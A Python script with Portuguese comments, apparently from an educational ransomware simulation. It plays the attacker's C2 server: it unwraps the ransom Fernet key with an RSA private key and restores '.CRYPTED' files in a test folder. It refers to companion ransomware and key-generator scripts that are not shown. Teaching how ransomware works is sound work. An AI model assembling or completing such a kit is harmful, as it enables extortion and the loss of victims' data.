# Para instalar as dependências, execute: pip install cryptography
import os
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

# ----------------------------------------------------------------------
# ESTE SCRIPT SIMULA O PROCESSO DE RESGATE DO SERVIDOR C2
# 1. Descriptografa a chave simétrica Fernet (o "segredo do resgate").
# 2. Descriptografa um arquivo de teste.
# ----------------------------------------------------------------------

CHAVE_PRIVADA_ARQUIVO = "private_key.pem"
CHAVE_DO_RESGATE_BIN = "CHAVE_DO_RESGATE.BIN"
EXTENSAO_CRIPTOGRAFADA = ".CRYPTED"

def carregar_chave_privada():
    """Carrega a chave privada do atacante (C2 Server)."""
    try:
        with open(CHAVE_PRIVADA_ARQUIVO, "rb") as key_file:
            return serialization.load_pem_private_key(
                key_file.read(),
                password=None,  # Sem senha para a simulação
                backend=default_backend()
            )
    except FileNotFoundError:
        print(f"[ERRO] Arquivo da chave privada '{CHAVE_PRIVADA_ARQUIVO}' não encontrado.")
        print("Certifique-se de que 'key_generator.py' foi executado primeiro.")
        sys.exit(1)

def descriptografar_chave_fernet(private_key_attacker):
    """
    Descriptografa a chave simétrica Fernet contida no arquivo de resgate
    usando a chave privada do atacante.
    """
    try:
        with open(CHAVE_DO_RESGATE_BIN, "rb") as f:
            chave_simetrica_criptografada = f.read()
    except FileNotFoundError:
        print(f"[ERRO] Arquivo de resgate '{CHAVE_DO_RESGATE_BIN}' não encontrado.")
        print("Execute o script de ransomware primeiro para criá-lo.")
        sys.exit(1)

    # Descriptografia RSA
    chave_simetrica_descriptografada = private_key_attacker.decrypt(
        chave_simetrica_criptografada,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    print("\n[SUCESSO C2] Chave Fernet simétrica descriptografada com sucesso!")
    return chave_simetrica_descriptografada

def descriptografar_arquivo(caminho_arquivo_criptografado, chave_fernet):
    """
    Função de descriptografia para simular o que o C2 enviaria de volta: 
    a chave Fernet simétrica.
    """
    try:
        f = Fernet(chave_fernet)
        
        # 1. Ler os dados criptografados
        with open(caminho_arquivo_criptografado, "rb") as file:
            dados_criptografados = file.read()
        
        # 2. Descriptografar os dados
        dados_descriptografados = f.decrypt(dados_criptografados)
        
        # 3. Sobrescrever o arquivo criptografado com dados descriptografados
        caminho_arquivo_original = caminho_arquivo_criptografado.replace(EXTENSAO_CRIPTOGRAFADA, "")
        with open(caminho_arquivo_original, "wb") as file:
            file.write(dados_descriptografados)

        # 4. Remover a extensão de criptografia
        os.rename(caminho_arquivo_criptografado, caminho_arquivo_original)
        
        print(f" -> Descriptografado: {caminho_arquivo_original}")

    except Exception as e:
        print(f"[ERRO] Falha ao descriptografar {caminho_arquivo_criptografado}: {e}")

def main_descriptografia():
    """Função principal do simulador de descriptografia do C2."""
    print("Iniciando simulação de Resgate/Descriptografia (Servidor C2)...")
    
    # 1. Carregar a chave privada do atacante
    chave_privada_atacante = carregar_chave_privada()

    # 2. Descriptografar a chave Fernet (o payload do resgate)
    chave_fernet_recuperada = descriptografar_chave_fernet(chave_privada_atacante)
    
    # 3. Encontrar arquivos criptografados (apenas para fins de teste)
    diretorio_alvo = "test_files"
    arquivos_criptografados = [
        os.path.join(raiz, arq) 
        for raiz, _, arquivos in os.walk(diretorio_alvo)
        for arq in arquivos if arq.endswith(EXTENSAO_CRIPTOGRAFADA)
    ]
    
    if not arquivos_criptografados:
        print(f"\nNenhum arquivo criptografado encontrado em '{diretorio_alvo}'.")
        print("Execute o script de ransomware primeiro.")
        return

    print(f"\nDescriptografando {len(arquivos_criptografados)} arquivos encontrados...")

    for arquivo in arquivos_criptografados:
        descriptografar_arquivo(arquivo, chave_fernet_recuperada)
        
    print("\n[SUCESSO EDUCAÇÃO] Simulação de Descriptografia concluída.")
    print("Os arquivos originais foram restaurados.")

if __name__ == "__main__":
    main_descriptografia()